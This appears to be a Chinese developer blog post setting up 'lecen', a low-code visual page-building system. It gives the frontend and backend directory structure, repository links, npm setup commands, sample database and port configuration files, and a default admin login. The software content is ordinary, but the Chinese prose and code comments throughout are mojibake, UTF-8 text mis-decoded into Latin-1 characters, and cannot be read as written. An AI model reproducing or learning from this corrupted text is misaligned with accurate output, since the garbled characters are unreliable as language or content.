.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä»‹ç»</h2>
<p>è¿™æ˜¯ä¸€å¥—å…¨æ–°çš„ä»¥ç»„ä»¶æ’æ§½ä¸ºæ„å»ºåŸºç¡€ã€è¯·æ±‚é“¾æ¥ä¸ºæ¥å£è°ƒç”¨ã€æ‰§è¡Œå¯„è¿ä¸ºå¤„ç†é€»è¾‘çš„å¯è§†åŒ–é…ç½®ç³»ç»Ÿï¼Œé™¤äº†å¯ä»¥å¯è§†åŒ–æ­å»ºç³»ç»Ÿé¡µé¢ï¼Œè¿˜å¯ä»¥å¯è§†åŒ–é…ç½®mockæ•°æ®ï¼Œ
æ‰€æœ‰çš„é¡µé¢ç›¸å…³æ•°æ®éƒ½æ”¯æŒç‰ˆæœ¬æ§åˆ¶çš„ç®¡ç†ï¼Œçµæ´»çš„æƒé™æ§åˆ¶å’Œæ¨¡å—é…ç½®ç­‰éƒ½ä¸ºç ”å‘äººå‘˜æä¾›äº†æå¤§çš„ä¾¿åˆ©æ€§ï¼Œæé«˜äº†ç”Ÿäº§æ–½å·¥çš„æ•ˆç‡ã€‚</p>
<h3 data-id="heading-1">è®¾è®¡è€ƒè™‘</h3>
<ul>
<li>
<p>è€ƒè™‘åˆ°é¢‘ç¹å‘å¸ƒå¯¼è‡´é¢‘ç¹éƒ¨ç½²ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€ä¸ªç›¸å…³ä»£ç çš„æŒä¹…åŒ–ï¼Œä»¥ä¾¿åœ¨çº¿ä¸Šèƒ½å®æ—¶ä¿®æ”¹ã€‚</p>
</li>
<li>
<p>è€ƒè™‘åˆ°éœ€æ±‚å¤šå˜ï¼Œè€Œå¤§å¤šéƒ½åªæ˜¯å˜åŒ–æ–‡å­—ã€ä½ç½®ã€æ ·å¼å’Œä¸€äº›ç®€å•çš„é€»è¾‘ç­‰å†…å®¹ï¼Œæˆ‘ä»¬éœ€è¦å¿«é€Ÿçš„äº¤ä»˜ï¼Œä»¥ä¾¿é™ä½ç»´æŠ¤æˆæœ¬ã€‚</p>
</li>
<li>
<p>è€ƒè™‘åˆ°ä¸åŒé¡µé¢çš„å¤ç”¨ç¨‹åº¦ã€ç›¸ä¼¼åº¦ï¼Œæˆ–è®¸åªæ˜¯æ¥å£ä¸åŒï¼Œæˆ‘ä»¬éœ€è¦å¿«é€Ÿçš„ç”Ÿæˆé¡µé¢ï¼Œé™ä½å¼€å‘æˆæœ¬ã€‚</p>
</li>
<li>
<p>è€ƒè™‘åˆ°ä¸åŒé¡µé¢ä¹‹é—´ç»„ä»¶çš„å¤ç”¨å’ŒåŒä¸€ä¸ªé¡µé¢ä¹‹é—´ç»„ä»¶çš„å¤ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠç»„ä»¶å°è£…å¥½ï¼Œæ”¹ä¸ºå¯¹å®ƒçš„å¼•ç”¨ï¼Œä»¥è¾¾åˆ°ç»„ä»¶æœ€é«˜å¤ç”¨çš„ç›®çš„ã€‚</p>
</li>
<li>
<p>è€ƒè™‘åˆ°åŒä¸€ä¸ªç»„ä»¶åœ¨ä¸åŒçš„åœ°æ–¹å¯èƒ½éœ€è¦ä¸åŒçš„å‘ˆç°å½¢å¼ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå±æ€§ã€æ–¹æ³•ã€äº‹ä»¶ç­‰åŠ¨æ€ä¼ é€’ç»™ç»„ä»¶ã€‚</p>
</li>
<li>
<p>è€ƒè™‘åˆ°çº¿ä¸Šé—®é¢˜å¤„ç†çš„åŠæ—¶æ€§ï¼Œä»¥åŠé¿å…æ¼æ”¹ã€åå¤ç­‰æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦æ›´å‹å¥½çš„æ’æŸ¥æ–¹å¼ã€‚</p>
</li>
</ul>
<p>åŸºäºä»¥ä¸Šç”šè‡³æ›´å¤šå…¶ä»–çš„åŸå› ï¼Œä¸ºæ­¤è®¾è®¡äº†æœ¬å¥—ç³»ç»Ÿã€‚</p>
<h3 data-id="heading-2">æ–°ç³»ç»Ÿå»ºç«‹</h3>
<p>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è®¿é—®ç”¨æˆ·ç³»ç»Ÿé¡µé¢ä¼šå‡ºç°å¦‚ä¸‹ä¿¡æ¯:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f4be0d90e8a484382a6189432cea122~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=x04bO98sFLfegEz9%2Fi%2BGVP4ZIf8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¿™æ˜¯å› ä¸ºæ­å»ºçš„ç³»ç»Ÿé™¤äº†é¡µé¢ä¹‹å¤–å…¶ä»–çš„æ‰€æœ‰çš„ç‚¹ä¹Ÿéƒ½æ˜¯å¯ä»¥é…ç½®çš„ï¼Œéœ€è¦ç»™ç³»ç»Ÿåšä¸€ä¸ªåˆå§‹åŒ–é…ç½®ï¼Œç„¶åå°±å¯ä»¥è®¿é—®ç™»å½•é¡µäº†</p>
<p>æ–°ç³»ç»Ÿçš„å»ºç«‹ä¸€èˆ¬åªéœ€ç®€å•çš„å‡ æ­¥é…ç½®</p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lnsstyp.com%2Fweb%2Fguide%2FsystemConfig%2FbasicInfo.html" target="_blank" title="http://www.lnsstyp.com/web/guide/systemConfig/basicInfo.html" ref="nofollow noopener noreferrer">åˆå§‹åŒ–ç³»ç»Ÿé…ç½®</a></p>
<h2 data-id="heading-3">ä¸Šæ‰‹</h2>
<h3 data-id="heading-4">æ¦‚è¿°</h3>
<p>é¡¹ç›®ç”±lecen-webå’Œlecen-serverä¸¤ä¸ªå­é¡¹ç›®æ„æˆã€‚</p>
<p>lecen-webæ˜¯å‰ç«¯é¡µé¢ï¼Œå¯ä»¥è¿è¡Œç³»ç»Ÿä»¥åŠè®¾è®¡ç”Ÿæˆé¡µé¢ã€‚</p>
<p>lecen-serveræ˜¯åç«¯æœåŠ¡ï¼Œæä¾›äº†æ•°æ®æŒä¹…åŒ–ä»¥åŠé’ˆå¯¹è¯¥å‰ç«¯ç³»ç»Ÿæ ¸å¿ƒåŠŸèƒ½çš„æ”¯æŒï¼Œä¸ä¸šåŠ¡æ— å…³</p>
<p>å‰ç«¯ç³»ç»Ÿä¸»è¦ç”±åœ¨çº¿ç¼–å†™ä»£ç ä¸å¯è§†åŒ–æ“ä½œä¸¤ç§æ–¹å¼æ¥æ„å»ºã€‚</p>
<p>æœ¬ç« èŠ‚ä¸»è¦ä»‹ç»é¡¹ç›®çš„ä¸»è¦ç»“æ„ï¼Œä»¥åŠå¯¹åº”çš„æ¨¡å—è¯´æ˜ã€‚</p>
<p>å¦‚éœ€äº†è§£å¦‚ä½•é€šè¿‡å¯è§†åŒ–æ“ä½œæ¥è®¾è®¡é¡µé¢ï¼Œè¯·å‚è€ƒé¡µé¢é…ç½®ä¸­çš„é¡µé¢è®¾è®¡ã€‚</p>
<h3 data-id="heading-5">ç›®å½•ç»“æ„</h3>
<pre><code class="hljs language-arduino" lang="arduino">/single-pass-lecen
â”œâ”€ lecen-server
    â”œâ”€ <span class="hljs-keyword">public</span>
        â”œâ”€ lcupload <span class="hljs-comment">// ç³»ç»Ÿèµ„æº</span>
        â”œâ”€ pageRecord <span class="hljs-comment">// æŒä¹…åŒ–æ•°æ®ç‰ˆæœ¬ç®¡ç†</span>
        â”œâ”€ temp <span class="hljs-comment">// ä¸´æ—¶æ–‡ä»¶</span>
        â””â”€ tool <span class="hljs-comment">// å·¥å…·æ–‡ä»¶</span>
    â”œâ”€ src
        â”œâ”€ auth <span class="hljs-comment">// ç”¨æˆ·è®¤è¯</span>
        â”œâ”€ camunda
            â”œâ”€ deployment <span class="hljs-comment">// æµç¨‹éƒ¨ç½²</span>
            â””â”€ tenant <span class="hljs-comment">// ç§Ÿæˆ·ç®¡ç†</span>
        â”œâ”€ common
            â”œâ”€ decorator <span class="hljs-comment">// å…¨å±€è£…é¥°å™¨</span>
            â”œâ”€ interceptor <span class="hljs-comment">// å…¨å±€æ‹¦æˆªå™¨</span>
            â”œâ”€ config.ts <span class="hljs-comment">// æœåŠ¡é…ç½®</span>
            â””â”€ field.entity.ts <span class="hljs-comment">// å…¬å…±å®ä½“å­—æ®µ</span>
        â”œâ”€ <span class="hljs-built_in">File</span> <span class="hljs-comment">// æ–‡ä»¶ç®¡ç†</span>
        â”œâ”€ git <span class="hljs-comment">// æŒä¹…åŒ–æ•°æ®ç‰ˆæœ¬æ§åˆ¶</span>
        â”œâ”€ PageComposition
            â”œâ”€ css <span class="hljs-comment">// æ ·å¼ç®¡ç†</span>
            â”œâ”€ form <span class="hljs-comment">// è¡¨å•ç®¡ç†</span>
            â”œâ”€ parasiticBond <span class="hljs-comment">// æ‰§è¡Œå¯„è¿ç®¡ç†</span>
            â”œâ”€ request <span class="hljs-comment">// è¯·æ±‚é“¾æ¥ç®¡ç†</span>
            â””â”€ view <span class="hljs-comment">// æ•°æ®è§†å›¾</span>
        â”œâ”€ schema <span class="hljs-comment">// ç®¡ç†mongooseæ•°æ®ç»“æ„</span>
        â”œâ”€ systemConfig
            â”œâ”€ basic <span class="hljs-comment">// åŸºæœ¬ä¿¡æ¯é…ç½®</span>
            â”œâ”€ dataSource <span class="hljs-comment">// æ•°æ®æºç®¡ç†</span>
            â”œâ”€ dictionary <span class="hljs-comment">// å­—å…¸ç®¡ç†</span>
            â”œâ”€ file <span class="hljs-comment">// æ–‡ä»¶é…ç½®ç®¡ç†</span>
            â”œâ”€ identity <span class="hljs-comment">// èº«ä»½ç®¡ç†</span>
            â”œâ”€ mock <span class="hljs-comment">// æ•°æ®æ¨¡æ‹Ÿç®¡ç†</span>
            â”œâ”€ <span class="hljs-keyword">module</span> <span class="hljs-comment">// æ¨¡å—ç®¡ç†</span>
            â”œâ”€ organization <span class="hljs-comment">// ç»„ç»‡ç»“æ„ç®¡ç†</span>
            â””â”€ router <span class="hljs-comment">// è·¯ç”±èœå•ç®¡ç†</span>
        â”œâ”€ systemTool
            â””â”€ puppeteer <span class="hljs-comment">// å±å¹•æˆªå›¾</span>
        â”œâ”€ user <span class="hljs-comment">// ç”¨æˆ·æ¨¡å—</span>
        â”œâ”€ util <span class="hljs-comment">// é¡¹ç›®ä¸­çš„å¸¸ç”¨å·¥å…·ç­‰</span>
        â”œâ”€ app.<span class="hljs-keyword">module</span>.ts <span class="hljs-comment">// æ¥å£ã€æœåŠ¡ã€å®ä½“ç­‰çš„æ¨¡å—æ³¨å†Œï¼Œæ•°æ®åº“è¿æ¥ç­‰</span>
        â””â”€ main.ts <span class="hljs-comment">// é¡¹ç›®å…¥å£ï¼Œé…ç½®å…¬å…±èµ„æºè·¯å¾„ã€è·¨åŸŸç­‰</span>
    â””â”€ package.json <span class="hljs-comment">// é¡¹ç›®ç®¡ç†æ–‡ä»¶</span>
â””â”€ lecen-web
    â”œâ”€ lib
        â””â”€ ckeditor5 <span class="hljs-comment">// å¯Œæ–‡æœ¬ç¼–è¾‘å™¨</span>
    â”œâ”€ src
        â”œâ”€ _Global
            â”œâ”€ plugin <span class="hljs-comment">// æ„å»ºæ’ä»¶</span>
            â””â”€ types <span class="hljs-comment">// tså£°æ˜</span>
        â”œâ”€ common
            â”œâ”€ assembly
                â”œâ”€ assembly <span class="hljs-comment">// å¤åˆ¶ç»„ä»¶</span>
                â”œâ”€ assembly <span class="hljs-comment">// ç¼–è¾‘å™¨ç»„ä»¶</span>
                â”œâ”€ list <span class="hljs-comment">// åˆ—è¡¨ç»„ä»¶</span>
                â””â”€ tagsInput <span class="hljs-comment">// è¾“å…¥ç»„ä»¶</span>
            â”œâ”€ css
                â”œâ”€ index.scss <span class="hljs-comment">// æ ·å¼åˆå§‹åŒ–</span>
                â”œâ”€ preset.scss <span class="hljs-comment">// é¢„ç½®æ ·å¼</span>
                â”œâ”€ root.scss <span class="hljs-comment">// è·Ÿæ ·å¼å˜é‡</span>
                â”œâ”€ unit.scss <span class="hljs-comment">// å•å…ƒæ ·å¼</span>
                â””â”€ variable.scss <span class="hljs-comment">// æ ·å¼å˜é‡</span>
            â”œâ”€ images
                â””â”€ design <span class="hljs-comment">// è®¾è®¡å™¨å›¾ç‰‡</span>
            â”œâ”€ js
                â”œâ”€ instance
                    â”œâ”€ base.ts <span class="hljs-comment">// åŸºç¡€å¯¹è±¡</span>
                    â”œâ”€ global.ts <span class="hljs-comment">// å…¨å±€å¯¹è±¡</span>
                    â”œâ”€ parasiticBond.ts <span class="hljs-comment">// å¯„è¿å¯¹è±¡</span>
                    â””â”€ request.ts <span class="hljs-comment">// è¯·æ±‚å¯¹è±¡</span>
                â”œâ”€ method
                    â””â”€ message.ts <span class="hljs-comment">// æ¶ˆæ¯æ–¹æ³•</span>
                â”œâ”€ compute.ts <span class="hljs-comment">// å€¼è®¡ç®—</span>
                â”œâ”€ control.ts <span class="hljs-comment">// æ§åˆ¶è®¡ç®—</span>
                â”œâ”€ index.ts <span class="hljs-comment">// é€šç”¨æ–¹æ³•</span>
                â”œâ”€ page.ts <span class="hljs-comment">// é¡µé¢æ“ä½œ</span>
                â”œâ”€ permission.ts <span class="hljs-comment">// æƒé™æ§åˆ¶</span>
                â”œâ”€ service.ts <span class="hljs-comment">// æä¾›çš„æœåŠ¡</span>
                â”œâ”€ shortCut.ts <span class="hljs-comment">// å¿«æ·æ–¹å¼</span>
                â”œâ”€ style.ts <span class="hljs-comment">// æ ·å¼æ§åˆ¶</span>
                â””â”€ uses.ts <span class="hljs-comment">// ç»„åˆå¼é˜²èŒƒ</span>
            â””â”€ svg
                â””â”€ xicons <span class="hljs-comment">// svgå›¾æ ‡</span>
        â”œâ”€ company <span class="hljs-comment">// å…¬å¸é…ç½®</span>
        â”œâ”€ components <span class="hljs-comment">// æ‰€æœ‰å°è£…çš„ç»„ä»¶</span>
        â”œâ”€ config <span class="hljs-comment">// é¡¹ç›®é…ç½®</span>
        â”œâ”€ registers
            â”œâ”€ component.ts <span class="hljs-comment">// æ³¨å†Œç»„ä»¶</span>
            â”œâ”€ directive.ts <span class="hljs-comment">// æ³¨å†ŒæŒ‡ä»¤</span>
            â”œâ”€ element-plus-icon.ts <span class="hljs-comment">// æ³¨å†Œå›¾æ ‡</span>
            â”œâ”€ init.ts <span class="hljs-comment">// æ³¨å†Œåˆå§‹åŒ–å†…å®¹</span>
            â””â”€ prototype.ts <span class="hljs-comment">// æ³¨å†ŒåŸå‹</span>
        â”œâ”€ request <span class="hljs-comment">// è¯·æ±‚</span>
        â”œâ”€ router <span class="hljs-comment">// è·¯ç”±</span>
        â”œâ”€ stores <span class="hljs-comment">// æœ¬åœ°å­˜å‚¨</span>
        â”œâ”€ surface <span class="hljs-comment">// ç•Œé¢</span>
        â”œâ”€ utils <span class="hljs-comment">// é¡¹ç›®ä¸­çš„å¸¸ç”¨å·¥å…·ç­‰</span>
        â”œâ”€ views
            â”œâ”€ camunda <span class="hljs-comment">// æµç¨‹ç®¡ç†</span>
            â”œâ”€ entry <span class="hljs-comment">// å…¥å£</span>
            â”œâ”€ container <span class="hljs-comment">// æ¸²æŸ“ç»„ä»¶ï¼Œæ ¸å¿ƒç»„ä»¶</span>
            â”œâ”€ organizationManagement <span class="hljs-comment">// ç»„ç»‡ç®¡ç†ï¼ŒåŒ…æ‹¬äººå‘˜å’Œèº«ä»½</span>
            â”œâ”€ pageConfig <span class="hljs-comment">// ç³»ç»Ÿé¡µé¢ç®¡ç†ï¼Œè®¾è®¡æ ¸å¿ƒ</span>
            â”œâ”€ systemConfig <span class="hljs-comment">// ç³»ç»Ÿé…ç½®ç®¡ç†ï¼Œæ ¸å¿ƒæ”¯æŒ</span>
            â”œâ”€ systemResource <span class="hljs-comment">// ç³»ç»Ÿèµ„æºç®¡ç†</span>
            â”œâ”€ systemTool <span class="hljs-comment">// ç³»ç»Ÿå·¥å…·ç®¡ç†</span>
            â”œâ”€ toolDown <span class="hljs-comment">// å·¥å…·ä¸‹è½½</span>
            â””â”€ utilities.ts <span class="hljs-comment">// å…¬ç”¨å·¥å…·ç®¡ç†</span>
        â”œâ”€ App <span class="hljs-comment">// æ ¹æŒ‚è½½ç»„ä»¶</span>
        â””â”€ main.ts <span class="hljs-comment">// ä¸»å…¥å£æ–‡ä»¶</span>
    â”œâ”€ package.json <span class="hljs-comment">// é¡¹ç›®ç®¡ç†æ–‡ä»¶</span>
    â””â”€ vite.config.ts <span class="hljs-comment">// viteé…ç½®</span>
</code></pre>
<h2 data-id="heading-6">æœ¬åœ°ç¯å¢ƒçš„æ­å»ºä¸å¯åŠ¨</h2>
<p>è®¿é—®é¡¹ç›®githubåœ°å€ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flnsstyp%2Flecen-web" target="_blank" title="https://github.com/lnsstyp/lecen-web" ref="nofollow noopener noreferrer">å‰ç«¯githubåœ°å€</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flnsstyp%2Flecen-server" target="_blank" title="https://github.com/lnsstyp/lecen-server" ref="nofollow noopener noreferrer">åç«¯githubåœ°å€</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flnsstyp%2Flecen-web" target="_blank" title="https://github.com/lnsstyp/lecen-web" ref="nofollow noopener noreferrer">github.com/lnsstyp/lecâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flnsstyp%2Flecen-server" target="_blank" title="https://github.com/lnsstyp/lecen-server" ref="nofollow noopener noreferrer">github.com/lnsstyp/lecâ€¦</a></p>
<p>ä¹Ÿå¯ä»¥è®¿é—®giteeçš„åœ°å€</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fzhclovexx%2Flecen-web" target="_blank" title="https://gitee.com/zhclovexx/lecen-web" ref="nofollow noopener noreferrer">å‰ç«¯giteeåœ°å€</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fzhclovexx%2Flecen-server" target="_blank" title="https://gitee.com/zhclovexx/lecen-server" ref="nofollow noopener noreferrer">åç«¯giteeåœ°å€</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fzhclovexx%2Flecen-web" target="_blank" title="https://gitee.com/zhclovexx/lecen-web" ref="nofollow noopener noreferrer">gitee.com/zhclovexx/lâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fzhclovexx%2Flecen-server" target="_blank" title="https://gitee.com/zhclovexx/lecen-server" ref="nofollow noopener noreferrer">gitee.com/zhclovexx/lâ€¦</a></p>
<p>å…‹éš†é¡¹ç›®åˆ°æœ¬åœ°ï¼Œåˆ†åˆ«è¿›å…¥lecen-webä¸lecen-serveræ–‡ä»¶å¤¹ä¸­</p>
<p>æ‰§è¡Œ <code>npm install</code></p>
<p>ä¾èµ–å®‰è£…å®Œæˆä¹‹åï¼Œåœ¨lecen-webä¸­</p>
<p>æ‰¾åˆ°<code>src/config/index.ts</code></p>
<p>ä¿®æ”¹å…¶ä¸­çš„é…ç½®é¡¹ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚æ¥è®¾ç½®</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è®¾ç½®é¡¹ç›®çš„è®¿é—®è·¯å¾„</span>
<span class="hljs-keyword">const</span> path = <span class="hljs-string">'/web'</span>
<span class="hljs-comment">// è®¾ç½®é¡¹ç›®çš„åç«¯è®¿é—®åœ°å€</span>
<span class="hljs-keyword">const</span> server = <span class="hljs-string">''</span>
<span class="hljs-comment">// è®¾ç½®é¡¹ç›®çš„åç«¯è®¿é—®ç«¯å£</span>
<span class="hljs-keyword">const</span> port = <span class="hljs-string">''</span>
<span class="hljs-comment">// å¯ä»¥è®¾ç½®å‘å¸ƒçš„ç‰ˆæœ¬å·</span>
<span class="hljs-keyword">const</span> version = <span class="hljs-string">'0.1'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  path,
  server,
  port,
  version,
}
</code></pre>
<p>æ‰§è¡Œ<code>npm run admin</code></p>
<p>å¯åŠ¨é¡¹ç›®çš„ç®¡ç†ç«¯</p>
<p>æ‰§è¡Œ<code>npm run user</code></p>
<p>å¯åŠ¨é¡¹ç›®çš„ç”¨æˆ·ç«¯</p>
<p>åœ¨lecen-serverä¸­</p>
<p>æ‰¾åˆ°<code>src/common/config.ts</code></p>
<p>ä¿®æ”¹å…¶ä¸­çš„é…ç½®é¡¹ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚æ¥è®¾ç½®</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è®¾ç½®è¿è¡Œçš„ç¯å¢ƒ</span>
<span class="hljs-keyword">const</span> environment = <span class="hljs-string">"localhost"</span>
<span class="hljs-comment">// è®¾ç½®ä½¿ç”¨çš„æ•°æ®åº“</span>
<span class="hljs-keyword">const</span> database = <span class="hljs-string">'mysql'</span>
<span class="hljs-comment">// è®¾ç½®gitç®¡ç†çš„æ–‡ä»¶å­˜æ”¾è·¯å¾„</span>
<span class="hljs-keyword">const</span> gitFolder = <span class="hljs-string">''</span>
<span class="hljs-comment">// è®¾ç½®camundaçš„è®¿é—®åœ°å€</span>
<span class="hljs-keyword">const</span> camundaUrl = <span class="hljs-string">''</span>
<span class="hljs-comment">// è¿æ¥mysqlçš„æ‰€æœ‰ç¯å¢ƒé…ç½®</span>
<span class="hljs-keyword">const</span> mysql = ({
  <span class="hljs-string">"localhost"</span>: {
    <span class="hljs-attr">host</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">port</span>: <span class="hljs-number">3306</span>,
    <span class="hljs-attr">username</span>: <span class="hljs-string">'root'</span>,
    <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">database</span>: <span class="hljs-string">''</span>
  }
})[environment]
<span class="hljs-comment">// è¿æ¥oracleçš„æ‰€æœ‰ç¯å¢ƒé…ç½®</span>
<span class="hljs-keyword">const</span> oracle = ({
  <span class="hljs-string">"localhost"</span>: {
    <span class="hljs-attr">host</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">port</span>: <span class="hljs-number">1521</span>,
    <span class="hljs-attr">username</span>: <span class="hljs-string">'root'</span>,
    <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">database</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">sid</span>: <span class="hljs-string">'ORCL'</span>
  }
})[environment]
<span class="hljs-comment">// è¿æ¥redisçš„æ‰€æœ‰ç¯å¢ƒé…ç½®</span>
<span class="hljs-keyword">const</span> redis = ({
  <span class="hljs-string">"localhost"</span>: {
    <span class="hljs-attr">port</span>: <span class="hljs-number">6379</span>,
    <span class="hljs-attr">host</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">db</span>: <span class="hljs-number">1</span>
  }
})[environment]
<span class="hljs-comment">// è¿æ¥mongooseçš„æ‰€æœ‰ç¯å¢ƒé…ç½®</span>
<span class="hljs-keyword">const</span> mongoose = ({
  <span class="hljs-string">"localhost"</span>: {
    <span class="hljs-attr">port</span>: <span class="hljs-number">27017</span>,
    <span class="hljs-attr">host</span>: <span class="hljs-string">'127.0.0.1'</span>,
  }
})[environment];
<span class="hljs-comment">// å¯åŠ¨çš„ç«¯å£å·</span>
<span class="hljs-keyword">const</span> port = ({
  <span class="hljs-string">"localhost"</span>: <span class="hljs-number">9101</span>
})[environment];

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  port,
  mysql,
  oracle,
  database,
  redis,
  mongoose,
  gitFolder,
  camundaUrl
}
</code></pre>
<p>æ‰§è¡Œ<code>npm run start</code></p>
<p>å¯åŠ¨é¡¹ç›®çš„åç«¯æœåŠ¡</p>
<p>å¦‚æœæ‰§è¡Œ<code>npm run start:dev</code></p>
<p>é‚£ä¹ˆå°†å¯åŠ¨ç›‘å¬æ¨¡å¼ï¼Œæ–‡ä»¶çš„ä¿®æ”¹ä¼šå®æ—¶é‡æ–°ç¼–è¯‘</p>
<h2 data-id="heading-7">è®¿é—®ç³»ç»Ÿ</h2>
<p>è®¿é—®åœ°å€ <code>http://localhost:5173/</code></p>
<p>å‡ºç°ç®¡ç†ç«¯ç™»å½•ç•Œé¢</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf2a8c028cd44c8582620615c560dd2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=qjpPAAfGf4bRA5CD8qwVugtbX7A%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä½¿ç”¨é»˜è®¤çš„ç”¨æˆ·åå¯†ç è¿›è¡Œç™»å½•ï¼š <code>lecen/lecen</code></p>
<p>ç™»å½•è¿›ç³»ç»Ÿä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å…ˆé…ç½®ç”¨æˆ·ç«¯çš„è®¿é—®åœ°å€ï¼Œå…ˆæ‰¾åˆ°åŸºæœ¬ä¿¡æ¯é…ç½®çš„å…¥å£ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd47f47040644ab09f163c5c8936a206~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=UPqkPjlm8M2m0sAdRLVh2GZgmcI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¯ä»¥é€šè¿‡å…¥å£ä¸­çš„åŸºæœ¬ä¿¡æ¯é…ç½®å¡ç‰‡è·³è½¬ï¼Œä¹Ÿå¯ä»¥ç‚¹å‡» <code>ç³»ç»Ÿé…ç½®</code> ä¸‹çš„ <code>åŸºæœ¬ä¿¡æ¯é…ç½®</code> èœå•</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b169ece446694e71bb67e6710f3ed458~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=OfKk8MmCFlzNFncqDTNINTj66Y8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>æœªé…ç½®æ—¶å°†æ˜¾ç¤ºç©ºç™½ï¼Œå…·ä½“é…ç½®å¯ <a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lnsstyp.com%2Fweb%2Fguide%2FsystemConfig%2FbasicInfo.html" target="_blank" title="http://www.lnsstyp.com/web/guide/systemConfig/basicInfo.html" ref="nofollow noopener noreferrer">å‚è§</a></p>
<h2 data-id="heading-8">åŸºæœ¬ä¿¡æ¯é…ç½®</h2>
<p>å¦‚æœéœ€è¦æ–°å¢åŠ ä¸€ä¸ªç”¨æˆ·ç«¯çš„è®¿é—®åœ°å€ï¼Œåˆ™åœ¨ã€ç³»ç»Ÿé…ç½®ã€‘-&gt;ã€åŸºæœ¬ä¿¡æ¯é…ç½®ã€‘çš„é¡µé¢ä¸­ç‚¹å‡»ã€æ·»åŠ ç³»ç»Ÿã€‘</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a50f939a1b14438af3836c139b34653~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=88lqt7hut3yR%2FMoY7koFAvHsLc0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¾“å…¥ç³»ç»Ÿåç§°å¹¶ <strong>å›è½¦</strong>ï¼Œ ç„¶åå‡ºç°ç³»ç»Ÿä¿¡æ¯é…ç½®é¡µé¢ã€‚</p>
<p>æ¯”å¦‚è¾“å…¥<code>æœ¬åœ°æµ‹è¯•ç¯å¢ƒ</code></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/727e56543b3d4a7bb583c77eaedb4146~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767601945&amp;x-signature=jF4UeirUkDPJFllWhxmhNHI39sQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
